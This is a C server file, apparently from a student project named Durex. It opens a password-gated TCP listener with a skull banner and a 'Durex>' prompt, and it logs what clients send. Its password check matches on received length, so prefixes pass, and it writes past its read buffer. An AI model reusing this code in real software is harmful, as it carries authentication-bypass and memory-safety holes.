/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 16:44:24 by banthony          #+#    #+#             */
/*   Updated: 2019/11/12 19:17:09 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "server.h"

// use send instead for clients
static void		puts_data_fd(char *data, size_t len, int fd)
{
	if (fd > 0 && data)
		write(fd, data, len);
}

static void		puts_msg_fd(char *msg, int fd)
{
	puts_data_fd(msg, strlen(msg), fd);
}

static void		client_info_fd(t_client clt, char *msg, int fd)
{
	char	client_info[255] = {0};

	ft_strncpy(client_info, "Client[", 7);
	ft_strncat(client_info, clt.addr, strlen(clt.addr));
	ft_strncat(client_info, "]:", 2);
	puts_data_fd(client_info, strlen(client_info), fd);
	puts_data_fd(msg, strlen(msg), fd);
}

static void		welcome_client(t_client *clt)
{
	char *mess;

	mess =	"/* ************************************************************************** */\n"
			"/*                                                        :::      ::::::::   */\n"
			"/*  \xe2\x98\xa0  - WELCOME TO DUREX - \xe2\x98\xa0"
										"                           :+:      :+:    :+:   */\n"
			"/*                                                    +:+ +:+         +:+     */\n"
			"/*      * 3 clients max                             +#+  +:+       +#+        */\n"
			"/*      * Enter 'help' to see all commands        +#+#+#+#+#+   +#+           */\n"
			"/*                                                     #+#    #+#             */\n"
			"/*                                                    ###   ########          */\n"
			"/* ************************************************************************** */\n"
		"\nDurex>";
	send(clt->socket, mess, strlen(mess), 0);
	clt->granted = true;
}

// Accept the connexion
// Check if the maximum of client is reached
// If it is refused the new clients with message
// If it's OK Add the client to the client list
// Ask for password to the client
// At each client handling we check the client is granted
// if it's not, compare readed data with password
// if it's match, welcome the clients,
// if it's mismatch refused the client connexion
static t_bool	new_client(t_server *server)
{
	int					cs;
	unsigned int		cs_len;
	struct sockaddr_in	csin;

	if ((cs = accept(server->srv_sock, (struct sockaddr*)&csin, &cs_len)) < 0)
	{
		// Log error
		return (false);
	}
	if (server->clients >= MAX_CLIENT)
	{
		// Log error max client reached
		char *mess = "Connexion refused\n";
		puts_data_fd(mess, strlen(mess), server->srv_log);
		puts_data_fd(mess, strlen(mess), cs);
		FD_CLR(cs, &server->masterfdset);
		close(cs);
		return (false);
	}

	// New client !
	t_list		*nc;
	char		*mess;
	t_client	new_client;
	new_client.socket = cs;
	new_client.addr = inet_ntoa(csin.sin_addr);
	new_client.granted = false;
	if (!(nc = ft_lstnew(&new_client, sizeof(new_client))))
	{
		// Log error - warn client
		FD_CLR(cs, &server->masterfdset);
		close(cs);
		return (false);
	}
	if (server->client_lst == NULL)
		server->client_lst = nc;
	else
		ft_lstadd(&server->client_lst, nc);

	mess = "\xe2\x98\x82  - Enter password:";
	puts_data_fd(mess, strlen(mess), cs);
	FD_SET(cs, &server->masterfdset);
	server->clients++;
	// Use buffer instead to call function once
	client_info_fd(new_client, "Connected !\n", server->srv_log);
	return (true);
}

t_bool	create_server(t_server *server, int port)
{
	int					sock;
	struct sockaddr_in	sin;

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	if ((bind(sock, (const struct sockaddr*)&sin, sizeof(sin))) < 0)
	{
		// Log error
		return (false);
	}
	listen(sock, MAX_PENDING_CLIENT);
	memset(server, 0, sizeof(t_server));
	server->port = port;
	server->srv_sock = sock;
	return (true);
}

static void		del_client(void *data, size_t size)
{
	if (!data)
		return ;
	(void)size;
}
static t_bool	client_handler(t_server *server, int fd)
{
	t_list		*elmt;
	t_list		*prev;
	t_client	*client;
	char		buf[READ_BUFFER_SIZE];
	ssize_t		ret;

	prev = NULL;
	elmt = server->client_lst;
	dprintf(server->srv_log, "SIZE_CLIENT_LIST:%zu\n", ft_lstlen(server->client_lst));
	while (elmt)
	{
		client = (t_client*)elmt->content;
		if (fd == client->socket)
		{
			// use rcv instead
			if ((ret = recv(fd, buf, READ_BUFFER_SIZE, 0)) < 0)
			{
				FD_CLR(fd, &server->masterfdset);
				close(fd);
				client_info_fd(*client, "deconnected.\n", server->srv_log);
				server->clients--;
				// If we are not on the first elmt, relink the list
				if (prev)
					prev->next = elmt->next;
				// Update the first elmt if it's the first elmt
				else
					server->client_lst = elmt->next;
				// Finally delete this elmt
				ft_lstdelone(&elmt, del_client);
				return (true);
			}
			if (client->granted == false)
			{
				char *mess = "\xe2\x98\x82  - Enter password:";
				(!ft_strncmp(buf, PASSWORD, (size_t)ret)) ? welcome_client(client)
					: puts_data_fd(mess, strlen(mess), fd);
				elmt->content = client;
				break ;
			}
			buf[ret] = '\0';
			client_info_fd(*client, buf, server->srv_log);
			puts_msg_fd("Durex>", fd);
			break ;
		}
		prev = elmt;
		elmt = elmt->next;
	}
	return (true);
}

t_bool	server_loop(t_server *server)
{
	int		i;
	fd_set	readfdset;

	FD_ZERO(&readfdset);
	FD_ZERO(&server->masterfdset);
	FD_SET(server->srv_sock, &server->masterfdset);
	// Code for tmp syslog
	server->srv_log = open("durex_log.txt", O_CREAT | O_RDWR, 0700);
	puts_msg_fd(SERVER_STARTED, server->srv_log);
	while (42)
	{
		readfdset = server->masterfdset;
		if (select(FD_SETSIZE, &readfdset, NULL, NULL, NULL) < 0)
		{
			puts_msg_fd("Select error\n", server->srv_log);
			return (false);
		}
		i = -1;
		while (++i < FD_SETSIZE)
		{
			// Does this descriptor is ready for read ?
			if (FD_ISSET(i, &readfdset) == 0)
				continue;
				// If it correspond to the server descriptor, handle a new connexion
			if (FD_ISSET(server->srv_sock, &readfdset))
				new_client(server);
			// Otherwise, handle client data
			else
				client_handler(server, i);
		}
	}
}
